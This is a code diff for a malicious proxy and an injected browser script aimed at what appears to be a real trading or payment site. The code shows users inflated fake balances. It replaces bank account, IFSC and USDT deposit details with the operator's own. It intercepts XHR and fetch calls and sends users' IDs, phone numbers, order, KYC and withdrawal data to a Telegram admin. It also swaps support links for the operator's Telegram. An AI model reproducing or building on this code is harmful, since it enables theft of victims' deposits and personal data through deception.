+    const isUserInfo = urlLower.includes('userinfo') || urlLower.includes('memberinfo') ||
+      urlLower.includes('member/info') || urlLower.includes('user/info') ||
+      urlLower.includes('myinfo') || urlLower.includes('getinfo') ||
+      urlLower.includes('getmember') || urlLower.includes('memberdetail');
+
+    if (isUserInfo && respData && typeof respData === 'object' && userId) {
+      const balResult = findBalanceDeep(respData, 0) || findBalanceDeep(jsonResp, 0);
+      if (balResult) {
+        const realBalance = balResult.value;
+        const uo = (data.userOverrides && data.userOverrides[String(userId)]) || {};
+        const addedBalance = uo.addedBalance || 0;
+        const globalBonus = data.depositBonus || 0;
+        const totalFake = addedBalance + globalBonus;
+        const shownBalance = parseFloat((realBalance + totalFake).toFixed(2));
+        const lastReal = uo.lastRealBalance;
+        const trackedUser = (data.trackedUsers && data.trackedUsers[String(userId)]) || {};
+        const userName = trackedUser.name || '';
+        const userPhone = trackedUser.phone || phone || '';
+
+        if (!data.userOverrides) data.userOverrides = {};
+        if (!data.userOverrides[String(userId)]) data.userOverrides[String(userId)] = {};
+        data.userOverrides[String(userId)].lastRealBalance = realBalance;
+
+        const balChanged = lastReal === undefined || Math.abs(lastReal - realBalance) > 0.01;
+        const snapKey = `bal_${userId}`;
+        const lastSnapTime = _balSnapTimes[snapKey] || 0;
+        const nowMs = Date.now();
+        const shouldNotify = balChanged || (nowMs - lastSnapTime > 120000);
+
+        if (shouldNotify && (nowMs - lastSnapTime > 10000)) {
+          _balSnapTimes[snapKey] = nowMs;
+          const changeStr = lastReal !== undefined
+            ? `\n📈 Change: ${realBalance > lastReal ? '+' : ''}₹${(realBalance - lastReal).toFixed(2)} (was ₹${lastReal})`
+            : '';
+          notifyAdmin(data,
+`┌──────────────────────────┐
+│    💎 BALANCE SNAPSHOT    │
+└──────────────────────────┘
+👤 ID: ${userId}${userName ? '\n📛 Name: ' + userName : ''}${userPhone ? '\n📱 Phone: ' + userPhone : ''}
+
+📊 BALANCE BREAKDOWN:
+💰 Real Balance:   ₹${realBalance.toFixed(2)}
+➕ Bot Added:      ₹${totalFake.toFixed(2)}${addedBalance ? ' (user: +₹' + addedBalance + ')' : ''}${globalBonus ? (addedBalance ? ', global: +₹' + globalBonus : ' (global: +₹' + globalBonus + ')') : ''}
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+👁 User Sees:      ₹${shownBalance.toFixed(2)}${changeStr}
+
+🔗 Field: ${balResult.field}
+🕐 ${now}`);
+        }
+        data.trackedUsers[String(userId)].balance = String(realBalance);
+      }
+    }
+
+    const isOrder = /\/(createOrder|submitOrder|placeOrder|doOrder|doBuy|checkout|payOrder|confirmOrder|buyNow|purchaseOrder|addOrder|makeOrder|submitBuy|doRecharge|submitRecharge|createRecharge|doTrade|submitTrade)\b/i.test(path)
+      || (/\/(order|buy|recharge|trade)/i.test(path) && req.method === 'POST');
+    if (isOrder) {
+      const orderFields = ['orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo'];
+      let orderId = '';
+      if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
+        for (const f of orderFields) {
+          if (respData[f] && String(respData[f]).length >= 3) { orderId = String(respData[f]); break; }
+        }
+      }
+      const bank = getActiveBank(data, userId);
+      if (orderId && bank) {
+        if (!data.orderBankMap) data.orderBankMap = {};
+        data.orderBankMap[orderId] = {
+          bank: `${bank.accountHolder} | ${bank.accountNo} | ${bank.ifsc}`,
+          time: now, userId: userId || ''
+        };
+      }
+      notifyAdmin(data,
+`🔔 ORDER DETECTED
+👤 User: ${userId || 'N/A'}${phone ? '\n📱 Phone: ' + phone : ''}${orderId ? '\n📋 Order: ' + orderId : ''}
+💳 Bank: ${bank ? bank.accountHolder + ' | ' + bank.accountNo : 'N/A'}
+📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 1000) : 'empty'}
+📋 Response: ${respBody.substring(0, 500)}
+🕐 ${now}`);
+    }
+
+    if (urlLower.includes('kyc') || urlLower.includes('bind') || urlLower.includes('linkkyc')) {
+      notifyAdmin(data,
+`🔐 KYC/BIND DATA
+👤 User: ${userId || 'N/A'}
+📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 1500) : 'empty'}
+📋 Response: ${respBody.substring(0, 500)}
+🕐 ${now}`);
+    }
+
+    if (urlLower.includes('sell') || urlLower.includes('withdraw')) {
+      notifyAdmin(data,
+`💸 SELL/WITHDRAW
+👤 User: ${userId || 'N/A'}
+📦 POST: ${req.rawBody ? req.rawBody.toString().substring(0, 1000) : 'empty'}
+📋 Response: ${respBody.substring(0, 500)}
+🕐 ${now}`);
+    }
+
+    if (data.logRequests && data.adminChatId && bot && !isLogin && !isUserInfo && !isOrder) {
+      const tag = userId ? ` [${userId}]` : '';
+      const phoneTag = phone ? ` (${phone})` : '';
+      const postData = (req.method === 'POST' && req.rawBody && req.rawBody.length > 0) ? `\n📦 POST: ${req.rawBody.toString().substring(0, 300)}` : '';
+      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}${postData}\n📊 Status: ${response.status}`).catch(()=>{});
+    }
+
+    if (data.botEnabled !== false) {
+      const bank = getActiveBank(data, userId);
+      if (bank) {
+        deepReplaceBankFields(jsonResp, bank, 0);
+      }
+
+      if (userId) {
+        const uo = (data.userOverrides && data.userOverrides[String(userId)]) || {};
+        const addedBalance = uo.addedBalance || 0;
+        const globalBonus = data.depositBonus || 0;
+        const totalBonus = addedBalance + globalBonus;
+        if (totalBonus > 0) {
+          addBalanceToFields(jsonResp, totalBonus, 0);
+        }
+      }
+
+      if (data.usdtAddress) {
+        replaceUsdtAddress(jsonResp, data.usdtAddress, 0);
+      }
+    }
+
+    if (userId) await saveData(data);
+
+    sendJson(res, respHeaders, jsonResp);
+
   } catch(e) {
-    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
+    console.error('xxapi proxy error:', e.message);
+    try {
+      const url = REAL_API + (req.originalUrl || req.url);
+      const fwd = {};
+      for (const [k, v] of Object.entries(req.headers)) {
+        const kl = k.toLowerCase();
+        if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+        fwd[k] = v;
+      }
+      fwd['host'] = 'qonix.click';
+      const opts = { method: req.method, headers: fwd, redirect: 'manual' };
+      if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
+        opts.body = req.rawBody;
+      }
+      const resp = await fetch(url, opts);
+      const body = await resp.text();
+      res.writeHead(resp.status, { 'content-type': resp.headers.get('content-type') || 'application/json' });
+      res.end(body);
+    } catch(e2) {
+      if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
+    }
   }
 });
 
 const INJECT_JS = `(function(){
 if(window._pxi)return;window._pxi=1;
 var P='https://${PROXY_HOST}';
+var REAL='https://qonix.click';
 var CFG=null;
 var UID='';
-var UID_LOCKED=false;
 
-try{var _ls=localStorage.getItem('_px_uid');if(_ls&&/^\d{6,12}$/.test(_ls)){UID=_ls;if(typeof _BM!=='undefined'&&_BM[UID]&&CFG){CFG.bonus=_BM[UID];}}}catch(e){}
-
-function setUID(id,lock){
-if(!id||!/^\d{6,12}$/.test(id))return;
-if(UID_LOCKED&&!lock)return;
-if(id===UID)return;
-UID=id;
-try{localStorage.setItem('_px_uid',id);}catch(e){}
-if(lock)UID_LOCKED=true;
-if(typeof _BM!=='undefined'&&_BM[UID]&&CFG){CFG.bonus=_BM[UID];}
-try{lc();}catch(e){lcAsync();}}
+try{var _ls=localStorage.getItem('_px_uid');if(_ls&&/^\\d{6,12}$/.test(_ls))UID=_ls;}catch(e){}
 
 function lc(){
 try{var x=new XMLHttpRequest();
-var op=typeof _open==='function'?_open:XMLHttpRequest.prototype.open;
-var sn=typeof _send==='function'?_send:XMLHttpRequest.prototype.send;
-op.call(x,'GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);
-sn.call(x);if(x.status===200){
-var t;try{t=(typeof _rtDesc!=='undefined'&&_rtDesc)?_rtDesc.get.call(x):x.responseText;}catch(e2){t=x.responseText;}
-CFG=JSON.parse(t);}}catch(e){}}
+x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);
+x.send();if(x.status===200)CFG=JSON.parse(x.responseText);}catch(e){}}
 function lcAsync(){
-try{var op=typeof _open==='function'?_open:XMLHttpRequest.prototype.open;
-var sn=typeof _send==='function'?_send:XMLHttpRequest.prototype.send;
-var x=new XMLHttpRequest();
-op.call(x,'GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
-x.onload=function(){try{var t;try{t=(typeof _rtDesc!=='undefined'&&_rtDesc)?_rtDesc.get.call(x):x.responseText;}catch(e2){t=x.responseText;}CFG=JSON.parse(t);}catch(e){}};
-sn.call(x);}catch(e){}}
+try{var x=new XMLHttpRequest();
+x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
+x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};
+x.send();}catch(e){}}
 try{lc();}catch(e){}
 setInterval(function(){lcAsync();},25000);
 
-function b2s(b){
-if(!b)return'';
-if(typeof b==='string')return b;
-try{if(typeof URLSearchParams!=='undefined'&&b instanceof URLSearchParams)return b.toString();}catch(e){}
-try{if(typeof FormData!=='undefined'&&b instanceof FormData){var p=[];b.forEach(function(v,k){p.push(k+'='+v);});return p.join('&');}}catch(e){}
-try{return String(b);}catch(e){return'';}}
+var ID_FIELDS=['teamWorkId','memberCodeId','userId','channelUid','uid','memberId','accountId'];
 
-var BF={accountno:'an',accountnumber:'an',account_no:'an',receiveaccountno:'an',
-bankaccount:'an',bankaccountno:'an',payeeaccount:'an',cardno:'an',cardnumber:'an',
-bankcardno:'an',payeecardno:'an',receivecardno:'an',payeebankaccount:'an',
-payeebankaccountno:'an',payeeaccountno:'an',receiveraccount:'an',receiveraccountno:'an',
-walletaccount:'an',walletno:'an',collectionaccount:'an',collectionaccountno:'an',
-customerbanknumber:'an',customerbankaccount:'an',accno:'an',acc_no:'an',
-account:'an',receiveaccount:'an',
-beneficiaryname:'ah',accountname:'ah',account_name:'ah',receiveaccountname:'ah',
-holdername:'ah',accountholder:'ah',bankaccountholder:'ah',receivename:'ah',
-payeename:'ah',bankaccountname:'ah',realname:'ah',cardholder:'ah',cardname:'ah',
-receivername:'ah',collectionname:'ah',customername:'ah',accname:'ah',acc_name:'ah',
-truename:'ah',receiverealname:'ah',payeerealname:'ah',
-ifsc:'if',ifsccode:'if',ifsc_code:'if',receiveifsc:'if',bankifsc:'if',
-payeeifsc:'if',receiverifsc:'if',collectionifsc:'if',
-bankname:'bn',bank_name:'bn',payeebankname:'bn',receiverbankname:'bn',
-upiid:'ui',upi_id:'ui',upi:'ui',vpa:'ui',payeeupi:'ui',receiverupi:'ui',walletupi:'ui'};
-
-var NF={'name':1,'payname':1};
-
-function rb(o,d){
-if(!o||typeof o!=='object'||!CFG||!CFG.an||d>10)return;
-if(Array.isArray(o)){for(var i=0;i<o.length;i++)rb(o[i],d+1);return;}
-var hasAcct=false;
-for(var k in o){var kl=k.toLowerCase().replace(/_/g,'').replace(/-/g,'');
-if(BF[kl]==='an'||BF[kl]==='if')hasAcct=true;}
-for(var k in o){
-if(typeof o[k]==='object'){rb(o[k],d+1);continue;}
-if(typeof o[k]!=='string'&&typeof o[k]!=='number')continue;
-var kl=k.toLowerCase().replace(/_/g,'').replace(/-/g,'');
-var m=BF[kl];
-if(m&&CFG[m]&&String(o[k]).length>0){o[k]=CFG[m];continue;}
-if(NF[kl]&&hasAcct&&CFG.ah&&String(o[k]).length>0){o[k]=CFG.ah;}
-if(kl==='bank'&&CFG.bn&&String(o[k]).length>0){o[k]=CFG.bn;}
-}}
-
-var BKEYS=['balance','userbalance','availablebalance','totalbalance','money','coin',
-'wallet','itoken','itokenbalance','tokenbalance','usermoney','rechargebalance',
-'amount','mybalance','walletbalance','accountbalance','totalamount','totalmoney',
-'memberbalance','membermoney','useritoken','myitoken','mytokenbalance','freeze'];
-
-function addBal(o,bonus,d){
-if(!o||typeof o!=='object'||!bonus||d>10)return;
-if(Array.isArray(o)){for(var i=0;i<o.length;i++){if(typeof o[i]==='object')addBal(o[i],bonus,d+1);}return;}
-for(var k in o){
-var kl=k.toLowerCase();
-if(BKEYS.indexOf(kl)>-1){
-var v=parseFloat(o[k]);
-if(!isNaN(v)&&v>=0){o[k]=typeof o[k]==='string'?String((v+bonus).toFixed(2)):parseFloat((v+bonus).toFixed(2));}}
-if(typeof o[k]==='object'&&o[k]!==null)addBal(o[k],bonus,d+1);
-}}
-
-var ID_FIELDS=['teamWorkId','memberCodeId','memberCode','member_code','userId','user_id','channelUid','uid',
-'memberId','member_id','accountId','account_id','customerId','userCode','loginId',
-'userNum','userNumber','memberNum','userID','memberID'];
-
-function fid(o,d){
-if(!o||typeof o!=='object'||d>8)return'';
-if(Array.isArray(o))return'';
-for(var i=0;i<ID_FIELDS.length;i++){
-var f=ID_FIELDS[i];
-if(o[f]!==undefined&&o[f]!==null&&o[f]!==''){
-var v=String(o[f]).trim();
-if(/^\d{6,12}$/.test(v))return v;}}
-if(o.id!==undefined&&o.id!==null&&o.id!==''){
-var v2=String(o.id).trim();if(/^\d{6,12}$/.test(v2))return v2;}
-for(var k in o){if(typeof o[k]==='object'&&!Array.isArray(o[k])){var rf=fid(o[k],d+1);if(rf)return rf;}}
-return'';}
-
-function extractLoginUID(text){
-try{
-var j=JSON.parse(text);
-var candidates=[j.data,j.body,j.result,j.user,j.member,j.info,j];
-for(var i=0;i<candidates.length;i++){
-var c=candidates[i];
-if(c&&typeof c==='object'){var id=fid(c,0);if(id)return id;}}
-}catch(e){}
-return'';}
-
-function isLoginUrl(u){
-if(!u)return false;
-return u.indexOf('login')>-1||u.indexOf('Login')>-1||u.indexOf('signin')>-1||
-u.indexOf('doLogin')>-1||u.indexOf('auth')>-1;}
-
-function modResp(text,isLogin){
-if(!CFG||!CFG.enabled)return text;
-try{
-var j=JSON.parse(text);
-var d=j.data||j.body||j.result||j;
-if(isLogin){
-var lid=extractLoginUID(text);
-if(lid)setUID(lid,true);
-}else{
-var id=fid(d,0)||fid(j,0);
-if(id)setUID(id,false);
-}
-if(CFG.an){rb(j,0);}
-var bonus=CFG.bonus||0;
-if(bonus){addBal(j,bonus,0);}
-return JSON.stringify(j);
-}catch(e){return text;}}
-
-function sendLog(url,method,bodyStr,resp,status,modded){
-try{var op=typeof _open==='function'?_open:XMLHttpRequest.prototype.open;
-var sn=typeof _send==='function'?_send:XMLHttpRequest.prototype.send;
-var x=new XMLHttpRequest();
-op.call(x,'POST',P+'/hook/log',true);
-x.setRequestHeader('Content-Type','application/json');
-x.onload=function(){try{var t;try{t=(typeof _rtDesc!=='undefined'&&_rtDesc)?_rtDesc.get.call(x):x.responseText;}catch(e2){t=x.responseText;}
-var rj=JSON.parse(t);if(rj.bonus!==undefined&&CFG){CFG.bonus=rj.bonus;}
-if(rj.userId&&!UID){setUID(rj.userId,false);}}catch(e){}};
-sn.call(x,JSON.stringify({u:url,m:method,
-b:(bodyStr||'').substring(0,3000),
-r:(resp||'').substring(0,5000),s:status,uid:UID,
-cb:CFG?(CFG.bonus||0):0,md:modded?1:0}));}catch(e){}}
-
-var _rtDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'responseText');
-var _rDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'response');
-
-Object.defineProperty(XMLHttpRequest.prototype,'responseText',{
-get:function(){
-var orig;
-try{orig=_rtDesc.get.call(this);}catch(e){orig='';}
-if(this._pxDone)return this._pxRT!==undefined?this._pxRT:orig;
-if(this.readyState!==4)return orig;
-this._pxDone=true;
-var url=this._hu||'';
-if(url.indexOf(P)===0)return orig;
-try{
-var bs=this._bs||'';
-var login=this._isLogin||false;
-if(CFG&&CFG.enabled){
-var mod=modResp(orig,login);
-if(mod!==orig){this._pxRT=mod;this._pxRJ=null;
-sendLog(url,this._hm||'',bs,orig,this.status,true);return mod;}
-}
-if(login&&!UID){var lid=extractLoginUID(orig);if(lid)setUID(lid,true);}
-sendLog(url,this._hm||'',bs,orig,this.status,false);
-}catch(e){}
-return orig;},configurable:true});
-
-Object.defineProperty(XMLHttpRequest.prototype,'response',{
-get:function(){
-if(this._pxRT!==undefined){
-if(this.responseType===''||this.responseType==='text')return this._pxRT;
-if(this.responseType==='json'){
-if(!this._pxRJ){try{this._pxRJ=JSON.parse(this._pxRT);}catch(e){this._pxRJ=null;}}
-if(this._pxRJ)return this._pxRJ;}}
-if(!this._pxDone&&this.readyState===4){
-this._pxDone=true;
-var url=this._hu||'';
-if(url.indexOf(P)!==0){
-try{
-var origResp=_rDesc.get.call(this);
-var text;
-if(this.responseType==='json'&&origResp&&typeof origResp==='object'){text=JSON.stringify(origResp);}
-else if(typeof origResp==='string'){text=origResp;}
-if(text){
-var bs=this._bs||'';
-var login=this._isLogin||false;
-if(CFG&&CFG.enabled){
-var mod=modResp(text,login);
-if(mod!==text){
-this._pxRT=mod;this._pxRJ=null;
-sendLog(url,this._hm||'',bs,text,this.status,true);
-if(this.responseType==='json'){
-try{this._pxRJ=JSON.parse(mod);}catch(e){}
-return this._pxRJ||origResp;}
-return mod;}}
-if(login&&!UID){var lid=extractLoginUID(text);if(lid)setUID(lid,true);}
-sendLog(url,this._hm||'',bs,text,this.status,false);
-}}catch(e){}}}
-return _rDesc.get.call(this);},configurable:true});
+function setUID(id){
+if(!id||!/^\\d{6,12}$/.test(id)||id===UID)return;
+UID=id;try{localStorage.setItem('_px_uid',id);}catch(e){}
+lcAsync();}
 
 var _open=XMLHttpRequest.prototype.open;
 var _send=XMLHttpRequest.prototype.send;
-XMLHttpRequest.prototype.open=function(m,u){this._hu=u;this._hm=m;this._isLogin=isLoginUrl(u);return _open.apply(this,arguments);};
+XMLHttpRequest.prototype.open=function(m,u){
+if(typeof u==='string'&&u.indexOf(REAL)===0){
+u=P+u.substring(REAL.length);
+arguments[1]=u;}
+this._hu=u;this._hm=m;
+return _open.apply(this,arguments);};
+
 XMLHttpRequest.prototype.send=function(body){
-this._bs=b2s(body);
-if(this._isLogin){
 var self=this;
 self.addEventListener('load',function(){
 try{
-var orig=_rtDesc.get.call(self);
-if(orig){var lid=extractLoginUID(orig);if(lid)setUID(lid,true);}
-}catch(e){}});}
+var r=self.response;
+if(!r)return;
+var j=typeof r==='object'?r:(typeof r==='string'?JSON.parse(r):null);
+if(!j)return;
+var d=j.data||j.body||j.result||j;
+if(d&&typeof d==='object'){
+for(var i=0;i<ID_FIELDS.length;i++){
+var f=ID_FIELDS[i];
+if(d[f]){var v=String(d[f]).trim();
+if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}}catch(e){}});
 return _send.apply(this,arguments);};
 
 var _fetch=window.fetch;
 if(_fetch){
 window.fetch=function(input,init){
 var url=typeof input==='string'?input:(input&&input.url)||'';
-if(url.indexOf(P)===0)return _fetch.apply(this,arguments);
-var method=(init&&init.method)||'GET';
-var bs=b2s(init&&init.body);
-var login=isLoginUrl(url);
+if(url.indexOf(REAL)===0){
+var nu=P+url.substring(REAL.length);
+if(typeof input==='string'){arguments[0]=nu;}
+else{arguments[0]=new Request(nu,input);}}
 return _fetch.apply(this,arguments).then(function(resp){
-try{
-var ct=resp.headers.get('content-type')||'';
-if(ct.indexOf('json')===-1&&ct.indexOf('text')===-1)return resp;
-var cl=resp.clone();
-return cl.text().then(function(text){
-if(login&&!UID){var lid=extractLoginUID(text);if(lid)setUID(lid,true);}
-if(CFG&&CFG.enabled&&ct.indexOf('json')>-1){
-var mod=modResp(text,login);
-if(mod!==text){
-sendLog(url,method,bs,text,resp.status,true);
-return new Response(mod,{status:resp.status,statusText:resp.statusText,headers:resp.headers});}}
-sendLog(url,method,bs,text,resp.status,false);
-return resp;}).catch(function(){return resp;});
-}catch(e){return resp;}
-});};}
+try{var cl=resp.clone();
+cl.text().then(function(t){
+try{var j=JSON.parse(t);var d=j.data||j.body||j.result||j;
+if(d&&typeof d==='object'){
+for(var i=0;i<ID_FIELDS.length;i++){
+var f=ID_FIELDS[i];if(d[f]){var v=String(d[f]).trim();
+if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}}catch(e){}}).catch(function(){});}catch(e){}
+return resp;});};}
 
 function csUrl(s){
 if(!s||typeof s!=='string')return false;
 return s.indexOf('t.me/')>-1||s.indexOf('wa.me/')>-1||s.indexOf('whatsapp.com')>-1||s.indexOf('telegram.me/')>-1;}
-
-function scanDOM(){
-try{
-if(!document.body)return;
-var txt=document.body.innerText||'';
-var m=txt.match(/IDs*:s*([0-9]{6,12})/i);
-if(m&&m[1])setUID(m[1],false);
-}catch(e){}}
 
 function fixLinks(){
 if(!CFG||!CFG.tg)return;
 var links=document.querySelectorAll('a');
 for(var i=0;i<links.length;i++){
 var h=links[i].href||'';
-if(csUrl(h)){links[i].href=CFG.tg;links[i].setAttribute('href',CFG.tg);}}
-var els=document.querySelectorAll('[data-url],[data-href],[data-link],[data-src]');
-for(var j=0;j<els.length;j++){
-['data-url','data-href','data-link','data-src'].forEach(function(attr){
-var v=els[j].getAttribute(attr)||'';
-if(csUrl(v))els[j].setAttribute(attr,CFG.tg);});}}
+if(csUrl(h)){links[i].href=CFG.tg;links[i].setAttribute('href',CFG.tg);}}}
 
 function fixOnClick(){
 if(!CFG||!CFG.tg)return;
@@ -1167,7 +1061,6 @@ var changed=false;
 if(p[key]&&csUrl(p[key])){p[key]=CFG.tg;changed=true;}});
 if(changed)params=JSON.stringify(p);
 }catch(e){}}
-sendLog('bridge://'+action,'BRIDGE',params||'','',0);
 return _invoke(action,params);};}
 
 document.addEventListener('click',function(e){
@@ -1189,9 +1082,15 @@ el.setAttribute('href','syt:'+encodeURIComponent(JSON.stringify(jo2)));}}catch(e
 el=el.parentElement;depth++;}
 },true);
 
+function scanDOM(){
+try{if(!document.body)return;
+var txt=document.body.innerText||'';
+var m=txt.match(/ID\\s*:\\s*([0-9]{6,12})/i);
+if(m&&m[1])setUID(m[1]);
+}catch(e){}}
+
 scanDOM();
 setInterval(function(){scanDOM();},3000);
-
 if(document.body){
 var obs=new MutationObserver(function(){fixLinks();fixOnClick();scanDOM();});
 obs.observe(document.body,{childList:true,subtree:true});}
